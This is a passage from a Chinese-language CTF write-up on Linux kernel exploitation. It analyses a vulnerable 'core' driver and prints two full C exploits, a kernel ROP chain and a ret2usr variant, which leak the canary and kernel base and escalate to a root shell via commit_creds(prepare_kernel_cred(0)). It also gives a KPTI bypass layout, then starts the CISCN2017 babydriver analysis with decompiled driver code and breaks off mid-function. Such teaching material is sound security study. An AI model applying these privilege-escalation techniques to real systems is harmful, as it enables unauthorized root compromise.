&amp;v6[off], 64LL);</code> 即将内核中的<code>v6[off]</code>中复制<code>64</code>字节到用户的<code>a1</code>中。由于<code>off</code>是我们可控的，而且程序也没有对<code>off</code>的合法性进行判断，所以我们可以将<code>canary</code>和地址等各种敏感信息泄露出来<br>在<code>core_copy_func</code>函数中有这么一段调用：<code>qmemcpy(v3, &amp;name, (unsigned __int16)a1);</code> <code>a1</code>存在类型转换，存在整数溢出漏洞，我们因此可以将在<code>name</code>中写入<code>rop</code>链，然后<code>copy</code>到<code>v3</code>中，实现控制<code>rip</code><br>而<code>name</code>的值可以在<code>core_write</code>中进行修改<br>所以我们的利用思路就很明显了，修改<code>off</code>-&gt;泄露地址-&gt;<code>name</code>中写<code>rop</code>链-&gt;整数溢出造成栈溢出执行<code>rop</code>链<br>这题有<code>kernel rop</code>和<code>ret2usr</code>两种打法</p><h3 id="kernel-rop"><a href="#kernel-rop" class="headerlink" title="kernel rop"></a>kernel rop</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> vm_base = <span class="number">0xffffffff81000000</span>;  <span class="comment">// 这个可以直接用checksec查看</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>,<span class="number">64</span>);  <span class="comment">// 设置off为64</span></span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>,buf);  <span class="comment">//用于泄露canary和地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----- stack -----\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>,buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary -&gt; 0x%lx\n&quot;</span>,canary);</span><br><span class="line">    <span class="type">size_t</span> code_base = buf[<span class="number">2</span>]<span class="number">-0x19b</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;code_base -&gt; 0x%lx\n&quot;</span>,code_base);</span><br><span class="line">    <span class="type">size_t</span> stack_base = code_base+<span class="number">0x2400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_base -&gt; 0x%lx\n&quot;</span>,stack_base);</span><br><span class="line"></span><br><span class="line">    vm_base = buf[<span class="number">4</span>] - <span class="number">0x1dd6d1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vm_base -&gt; 0x%lx\n&quot;</span>,vm_base);</span><br><span class="line">    <span class="type">size_t</span> swapgs = vm_base + <span class="number">0xa012da</span>;</span><br><span class="line">    <span class="type">size_t</span> iretq = vm_base + <span class="number">0x50ac2</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = vm_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = vm_base + <span class="number">0x9cce0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rdi = vm_base + <span class="number">0xb2f</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdx = vm_base + <span class="number">0xa0f49</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_call_rdx = vm_base + <span class="number">0x1aa6a</span>;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">8</span>] = canary;</span><br><span class="line">    rop[<span class="number">9</span>] = buf[<span class="number">1</span>]; <span class="comment">// old rbp</span></span><br><span class="line">    rop[<span class="number">10</span>] = pop_rdi;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">12</span>] = prepare_kernel_cred;</span><br><span class="line">    rop[<span class="number">13</span>] = pop_rdx;</span><br><span class="line">    rop[<span class="number">14</span>] = pop_rdx;</span><br><span class="line">    rop[<span class="number">15</span>] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[<span class="number">16</span>] = commit_creds;</span><br><span class="line">    rop[<span class="number">17</span>] = swapgs;</span><br><span class="line">    rop[<span class="number">18</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">19</span>] = iretq;  <span class="comment">// 切换至用户</span></span><br><span class="line">    rop[<span class="number">20</span>] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    rop[<span class="number">21</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">22</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">23</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">24</span>] = user_ss;</span><br><span class="line">    write(<span class="number">0</span>,<span class="string">&quot;test!&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    write(fd,rop,<span class="number">0xd0</span>);  <span class="comment">// 将rop链写进name全局变量内</span></span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffff000000d0</span>);  <span class="comment">// 将name中的rop链复制到v3中，覆盖ret来控制rip</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_sp),<span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> c_c;</span><br><span class="line"><span class="type">size_t</span> p_k_c;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = p_k_c;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">char</span>*) = c_c;</span><br><span class="line">    (*cc)( (*pkc)(<span class="number">0</span>) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> vm_base = <span class="number">0xffffffff81000000</span>;  </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>,<span class="number">64</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>,buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----- stack -----\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>,buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary -&gt; 0x%lx\n&quot;</span>,canary);</span><br><span class="line"></span><br><span class="line">    vm_base = buf[<span class="number">4</span>] - <span class="number">0x1dd6d1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vm_base -&gt; 0x%lx\n&quot;</span>,vm_base);</span><br><span class="line">    <span class="type">size_t</span> swapgs = vm_base + <span class="number">0xa012da</span>;</span><br><span class="line">    <span class="type">size_t</span> iretq = vm_base + <span class="number">0x50ac2</span>;</span><br><span class="line">    <span class="type">size_t</span> commit_creds = vm_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">    <span class="type">size_t</span> prepare_kernel_cred = vm_base + <span class="number">0x9cce0</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi = vm_base + <span class="number">0xb2f</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rax_rdi = vm_base + <span class="number">0x52d8d</span>;</span><br><span class="line"></span><br><span class="line">    c_c = commit_creds;</span><br><span class="line">    p_k_c = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">8</span>] = canary; </span><br><span class="line">    rop[<span class="number">9</span>] = buf[<span class="number">1</span>];  <span class="comment">// old rbp</span></span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="type">size_t</span>)getRoot;  <span class="comment">// ret2usr 内核执行用户空间的函数</span></span><br><span class="line">    rop[<span class="number">11</span>] = swapgs;  <span class="comment">// 恢复现场</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = iretq;  <span class="comment">// 切换至用户</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">    write(<span class="number">0</span>,<span class="string">&quot;test!&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    write(fd,rop,<span class="number">0xc0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffff000000c0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该打法就不做解释了，网上很多文章有讲，<code>ret2usr</code>就是用户态不能访问内核态的东西（对于没有<code>SMAP/SMEP</code>的情况下把内核指针重定向到用户空间的利用方式称为<code>ret2usr</code>），但是内核态可以访问用户态的东西，所以就可以利用内核的漏洞，在内核态中调用用户态的程序(函数或<code>shellcode</code>)。但这种方法在今天是很有局限性的，因为会有一种叫<code>SMEP</code>的保护机制禁止内核态执行用户态的程序，但这道题没有开<code>SMEP</code></p><h3 id="若开启KPTI"><a href="#若开启KPTI" class="headerlink" title="若开启KPTI"></a>若开启KPTI</h3><p>当内核开启<code>KPTI</code>保护，我们就无法直接通过<code>swapgs</code>和<code>iretq</code>来直接实现内核向用户态的切换，但我们可以使用<code>swapgs_restore_regs_and_return_to_usermode</code>这一个函数，其具体栈布局可以为：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs<span class="built_in">_</span>restore<span class="built_in">_</span>regs<span class="built_in">_</span>and<span class="built_in">_</span>return<span class="built_in">_</span>to<span class="built_in">_</span>usermode</span><br><span class="line">0 // padding</span><br><span class="line">0 // padding</span><br><span class="line">(size<span class="built_in">_</span>t)getShell</span><br><span class="line">user<span class="built_in">_</span>cs</span><br><span class="line">user<span class="built_in">_</span>rflags</span><br><span class="line">user<span class="built_in">_</span>sp</span><br><span class="line">user<span class="built_in">_</span>ss</span><br></pre></td></tr></table></figure><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 babydriver"></a>CISCN2017 babydriver</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init"></a>babydriver_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v3</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    v1 = babydev_no;</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v2 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = device_create(v3, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351, <span class="number">0LL</span>);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span 